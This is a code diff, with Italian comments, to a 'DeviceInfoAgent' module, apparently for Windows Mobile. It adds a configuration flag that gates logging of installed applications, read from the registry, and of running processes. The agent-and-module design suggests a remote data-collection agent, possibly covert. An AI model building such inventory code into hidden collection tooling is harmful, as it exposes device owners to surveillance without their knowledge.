@@ -18,9 +18,19 @@ DWORD WINAPI DeviceInfoAgent(LPVOID lpParam) {
 	SYSTEM_INFO si;
 	MEMORYSTATUS ms;
 	UINT uDisks, i;
+	Configuration *conf;
+	BOOL bList;
 
 	Module *me = (Module *)lpParam;
 	HANDLE eventHandle;
+
+	conf = me->getConf();
+
+	try {
+		bList = conf->getBool(L"list");
+	} catch (...) {
+		bList = FALSE;
+	}
 
 	me->setStatus(MODULE_RUNNING);
 	eventHandle = me->getEvent();
@@ -242,68 +252,70 @@ DWORD WINAPI DeviceInfoAgent(LPVOID lpParam) {
 	wsprintf(wLine, L"Uptime: %d days %d hours %d minutes\n\n", dwDays, dwHours, dwMinutes);
 	log.WriteLog((BYTE *)&wLine, WideLen(wLine));
 
-	// Leggiamo la lista dei programmi installati
-	do {
-		HKEY hApps;
-		LONG lRet;
-		UINT i;
-		WCHAR wKeyName[256] = {0};
-		DWORD dwKeySize = sizeof(wKeyName) / sizeof(WCHAR);
+	if (bList) {
+		// Leggiamo la lista dei programmi installati
+		do {
+			HKEY hApps;
+			LONG lRet;
+			UINT i;
+			WCHAR wKeyName[256] = {0};
+			DWORD dwKeySize = sizeof(wKeyName) / sizeof(WCHAR);
 
-		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Apps", 0, 0, &hApps) != ERROR_SUCCESS)
-			break;
-
-		wsprintf(wLine, L"Application List:\n");
-		log.WriteLog((BYTE *)&wLine, WideLen(wLine));
-
-		for (i = 0; ; i++) {
-			lRet = RegEnumKeyEx(hApps, i, wKeyName, &dwKeySize, NULL, NULL, NULL, NULL);
-
-			if (lRet == ERROR_MORE_DATA) {
-				continue;
-			}
-
-			if (lRet != ERROR_SUCCESS) {
-				RegCloseKey(hApps);
+			if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Apps", 0, 0, &hApps) != ERROR_SUCCESS)
 				break;
+
+			wsprintf(wLine, L"Application List:\n");
+			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
+
+			for (i = 0; ; i++) {
+				lRet = RegEnumKeyEx(hApps, i, wKeyName, &dwKeySize, NULL, NULL, NULL, NULL);
+
+				if (lRet == ERROR_MORE_DATA) {
+					continue;
+				}
+
+				if (lRet != ERROR_SUCCESS) {
+					RegCloseKey(hApps);
+					break;
+				}
+
+				wsprintf(wLine, L"%s\n", wKeyName);
+				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
+				dwKeySize = sizeof(wKeyName) / sizeof(WCHAR);
+			}
+		} while(0);
+
+		// Prendiamo la lista dei processi
+		do {
+			wsprintf(wLine, L"\nProcess List\n", dwDays, dwHours, dwMinutes);
+			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
+
+			// Il secondo flag e' un undocumented che serve a NON richiedere la lista
+			// degli heaps altrimenti la funzione fallisce sempre per mancanza di RAM.
+			PROCESSENTRY32 pe;
+			HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);
+
+			if (hSnap == INVALID_HANDLE_VALUE)
+				break;
+
+			pe.dwSize = sizeof(PROCESSENTRY32);
+
+			if (Process32First(hSnap, &pe)) {
+				do {
+					wsprintf(wLine, L"PID: 0x%08x - ", pe.th32ProcessID);
+					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
+
+					wsprintf(wLine, L"%s", pe.szExeFile);
+					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
+
+					wsprintf(wLine, L"\n");
+					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
+				} while (Process32Next(hSnap, &pe));
 			}
 
-			wsprintf(wLine, L"%s\n", wKeyName);
-			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
-			dwKeySize = sizeof(wKeyName) / sizeof(WCHAR);
-		}
-	} while(0);
-
-	// Prendiamo la lista dei processi
-	do {
-		wsprintf(wLine, L"\nProcess List\n", dwDays, dwHours, dwMinutes);
-		log.WriteLog((BYTE *)&wLine, WideLen(wLine));
-
-		// Il secondo flag e' un undocumented che serve a NON richiedere la lista
-		// degli heaps altrimenti la funzione fallisce sempre per mancanza di RAM.
-		PROCESSENTRY32 pe;
-		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);
-
-		if (hSnap == INVALID_HANDLE_VALUE)
-			break;
-
-		pe.dwSize = sizeof(PROCESSENTRY32);
-
-		if (Process32First(hSnap, &pe)) {
-			do {
-				wsprintf(wLine, L"PID: 0x%08x - ", pe.th32ProcessID);
-				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
-
-				wsprintf(wLine, L"%s", pe.szExeFile);
-				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
-
-				wsprintf(wLine, L"\n");
-				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
-			} while (Process32Next(hSnap, &pe));
-		}
-
-		CloseToolhelp32Snapshot(hSnap);
-	} while(0);
+			CloseToolhelp32Snapshot(hSnap);
+		} while(0);
+	}
 
 	WCHAR wNull = 0;
 	log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));
